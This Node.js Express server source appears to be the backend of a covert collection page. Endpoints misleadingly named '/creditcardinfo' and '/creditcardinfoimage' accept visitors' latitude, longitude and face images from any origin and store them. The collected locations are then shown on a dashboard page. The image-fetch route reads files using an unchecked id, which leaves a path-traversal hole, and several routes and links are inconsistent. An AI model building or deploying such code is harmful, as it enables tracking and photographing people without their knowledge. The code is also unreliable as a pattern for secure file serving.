const express = require('express'),
      app     = express();
      http    = require('http').Server(app);
      port    = process.env.PORT || 5000;
      path    = require('path');
      bodyParser = require('body-parser');
      nodemailer = require('nodemailer');
      mysql = require('mysql');
      fs = require('fs');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.set('views', path.join(__dirname,'views'));
app.set('view engine', 'mustache');
app.engine('mustache', require('hogan-middleware').__express);

class dataHolder {
  constructor(lat, long, accuracy, id){
    this.lat = lat;
    this.long = long;
    this.accuracy = accuracy;
    this.imgLink = __dirname + '/getfaceimage?id=' + id;
  }
}

var data = [];

app.get("/", (req, res, next) =>{
  res.render("home", {data: JSON.stringify(data) });
});

app.get("/color", (req, res, next) =>{
  res.render("color");
});

app.get("/app/getfaceimage", (req, res,next) =>{

 id = req.query.id;

 fs.readFile(__dirname + "/Images/faceImage" + id + ".jpg", function(err,fileData){
    if(err)
      res.send(err);
    else
      res.send(fileData)
  });
})

app.post("/creditcardinfo", (req,res,next) =>{
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');
  res.setHeader('Access-Control-Allow-Credentials', true);

  reqBody = req.body;
  data.push(new dataHolder(reqBody.lat, reqBody.long, reqBody.accuracy, data.length+1));
  console.log("New Data: " + data);

  res.sendStatus(200);
});

app.post("/creditcardinfoimage", (req,res,next) =>{
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');
  res.setHeader('Access-Control-Allow-Credentials', true);

  console.log(req.body);
  reqBody = req.body;
  var link = __dirname + '/Images/faceImage' + data.length + ".jpg";
  console.log(link);
  fs.writeFile(link, req.body, function(err){
    if(err)
      console.log("Error: " + err);
  });

  fs.readFile(link, function(err,fileData){
    if(err)
      console.log( "Error: " + err);
    else
      console.log("file Data: " + JSON.stringify(fileData));
  });

  res.sendStatus(200);
});

http.listen(port, function(){
  console.log('listening on *:' + port);
});

module.exports = app;
